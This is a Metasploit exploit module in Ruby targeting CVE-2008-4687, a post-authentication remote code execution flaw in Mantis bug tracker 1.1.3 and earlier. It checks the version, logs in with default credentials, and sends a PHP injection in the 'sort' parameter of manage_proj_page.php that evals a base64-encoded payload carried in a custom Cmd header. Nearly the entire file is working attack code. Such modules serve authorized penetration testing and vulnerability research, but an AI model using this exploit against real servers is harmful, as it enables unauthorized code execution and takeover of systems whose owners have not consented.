##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Mantis manage_proj_page PHP Code Execution',
      'Description'    => %q{
        Mantis v1.1.3 and earlier is vulnerable to a post-authentication Remote
        Code Execution vulnerability in the sort parameter of the
        manage_proj_page.php page.
      },
      'Author'         => [
        'EgiX',      # Exploit-DB Entry Author
        'Lars Sorenson'      # MSF module author
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['EDB', '6768'],
          ['URL', 'https://www.exploit-db.com/exploits/6768/'],
          ['CVE', '2008-4687'],
        ],
       'Privileged' => false,
       'Platform'   => ['php'],
       'Arch'       => ARCH_PHP,
       'Targets' =>
          [
            [ 'Mantis <= 1.1.3', { } ],
          ],
      'DisclosureDate' => 'Oct 16, 2008',
      'DefaultTarget' => 0))
     register_options(
      [
        OptString.new('TARGETURI', [true, 'The path to the Mantis installation', '/mantisbt/']),
        OptString.new('USERNAME', [true, 'The username to log in as', 'administrator']),
        OptString.new('PASSWORD', [true, 'The password to log in with', 'root']),
        Opt::RPORT(80)
      ])
  end

  def check
    vprint_status('Checking Mantis version ...')
    res = send_request_cgi({
      'uri'    => normalize_uri(target_uri.path, 'login_page.php'),
      'method' => 'GET'
    })

    unless res
      vprint_error('Connection to host failed!')
      return CheckCode::Unknown
    end

    unless res.body =~ /Mantis ([0-9]+).([0-9]+).([0-9]+)/
      vprint_error('Cannot determine Mantis version!')
      return CheckCode::Unknown
    end

    major = Regexp.last_match[1]
    minor = Regexp.last_match[2]
    rev = Regexp.last_match[3]

    vprint_status("Mantis version #{major}.#{minor}.#{rev} detected")

    unless res.code == 200 && (major.to_i > 1 || minor.to_i > 1 || (minor.to_i == 1 && rev.to_i > 3))
      return CheckCode::Appears
    end

    CheckCode::Safe
  end

  def login
    print_status("Logging in as #{datastore['username']}:#{datastore['password']} ... ")
    res = send_request_cgi({
        'method'   => 'GET',
        'uri'      => normalize_uri(target_uri.path, 'login_page.php'),
    })
    unless res
      fail_with(Failure::Unknown, 'Cannot access host to log in!')
    end
    res = send_request_cgi({
      'uri'       => normalize_uri(target_uri.path, 'login.php'),
      'method'    => 'POST',
      'vars_post' => {
        'username': datastore['username'],
        'password': datastore['password']
      },
      'headers' => {
        'Cookie': "PHPSESSID=#{res.get_cookies}"
      }
    })
    unless res
      fail_with(Failure::Unknown, 'Cannot access host to log in!')
    end
    fail_with(Failure::NoAccess, 'Login failed!') unless res.code == 302
    fail_with(Failure::NoAccess, 'Wrong credentials!') unless !res.redirection.to_s.include?('login_page.php')
    res.get_cookies
  end

  def exploit
    fail_with(Failure::NotVulnerable, 'Target is not vulnerable!') unless check == CheckCode::Appears

    cookie = login
    print_status('Sending payload ...')
    payload_clean = payload.encoded.gsub(/(\s+)|(#.*)/, '')
    payload_b64 = Rex::Text.encode_base64(payload_clean)
    data = {
      'sort' => "']);}error_reporting(0);print(_code_);eval(base64_decode($_SERVER[HTTP_CMD]));die();#",
    }
    res = send_request_cgi({
      'uri'       => normalize_uri(target_uri.path, 'manage_proj_page.php'),
      'method'    => 'POST',
      'vars_post' => data,
      'headers' => {
        'Connection': 'close',
	'Cookie': cookie.to_s,
        'Cmd': payload_b64
      }
    })
    fail_with(Failure::Unknown, 'Host disconnected during exploit!') unless res
  end
end
